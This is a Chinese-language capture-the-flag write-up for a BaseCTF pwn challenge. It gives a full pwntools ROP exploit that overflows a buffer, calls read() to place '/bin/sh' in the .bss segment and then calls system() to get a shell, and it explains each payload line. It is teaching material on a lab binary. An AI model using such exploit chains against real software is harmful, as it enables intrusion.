# Basectf pwn方向“彻底失去她”

by Maple

和“我把她丢了”比较类似，都是ROP简单构造，但是源码中没有bin/sh，需要通过read读取到bss段，再进行调用

需要注意read的三个参数顺序是rdi，rsi，rdx，我们应该依次布置为0，buf,0x10，此时调用read函数就是read(0,buf,0x10)

```
from pwn import *
p = process("./cdsqt")
elf = ELF('./cdsqt')

system = elf.plt['system']
read = elf.plt['read']
pop_rdi = 0x401196
pop_rsi = 0x4011ad
pop_rdx = 0x401265
bss = 0x4040A0

p.recv()

payload = b'a'*(0xa+8)
payload+=p64(pop_rdi)+p64(0)
payload+=p64(pop_rsi)+p64(bss)
payload+=p64(pop_rdx)+p64(0x10)
payload+=p64(read)#read(0,buf,0x10)
payload+=p64(pop_rdi)+p64(bss)+p64(system)

p.sendline(payload)
p.sendline(b'/bin/sh\x00')

p.interactive()
```

解释内容；

## payload = b'a'*(0xa+8)

填充字节，用于覆盖返回地址之前的内存空间，使其到达返回地址的位置

## payload+=p64(pop_rdi)+p64(0)

将0弹入rdi寄存器，因为rdi是read函数的第一个参数，表示文件描述符，0代表标准输入

## payload+=p64(pop_rsi)+p64(bss)

将bss段的地址弹到rsi寄存器，rsi是read函数的第二个参数，表示读取数据的缓冲区地址

## payload+=p64(pop_rdx)+p64(0x10)

将0x10弹到rdx寄存器，rdx是read函数的第三个参数，表示读取的字节数

## payload+=p64(read)

调用read函数，这个时候read函数被构造为了`read(0,bss,0x10)`,即从标准输入读取0x10个字节的数据到bss段

## payload+=p64(pop_rdi)+p64(bss)+p64(system)

将bss段的地址弹到rdi寄存器，作为system函数的参数，然后调用system

## 这里为什么没有ret了

建议自己搜索学习一下

提示bss段地址为`0x4040A0`,而“我把她丢了”的字符串bin/sh的地址为`0x402008`